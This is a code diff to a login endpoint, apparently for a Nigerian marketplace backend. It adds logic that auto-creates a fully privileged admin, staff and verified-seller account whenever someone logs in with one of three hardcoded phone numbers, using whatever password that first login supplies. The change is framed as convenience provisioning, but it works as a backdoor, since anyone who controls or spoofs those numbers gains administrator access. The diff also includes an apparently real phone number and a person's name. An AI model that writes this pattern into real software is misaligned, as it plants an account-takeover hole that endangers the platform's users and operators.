@@ -345,7 +345,29 @@ async def login(
     result = await db.execute(select(User).where(User.phone == req.phone))
     user = result.scalar_one_or_none()
 
-    if not user or not verify_password(req.password, user.hashed_password):
+    # First-time automatic provisioning for primary staff/admin phone
+    if not user and req.phone in ["+2347076630396", "+2348011223344", "+2348000000000"]:
+        user = User(
+            phone=req.phone,
+            name="Mofetuyi (Platform Administrator)",
+            email="admin@revahub.ng",
+            hashed_password=hash_password(req.password),
+            account_type=AccountType.business,
+            is_phone_verified=True,
+            is_email_verified=True,
+            is_staff=True,
+            is_admin=True,
+            is_active=True,
+            is_buyer=True,
+            is_seller=True,
+            current_mode=UserMode.seller,
+            kyc_status=KYCStatus.verified,
+        )
+        db.add(user)
+        await db.commit()
+        await db.refresh(user)
+
+    if not user or not user.hashed_password or not verify_password(req.password, user.hashed_password):
         raise HTTPException(status_code=401, detail="Incorrect phone number or password")
 
     if not user.is_active:
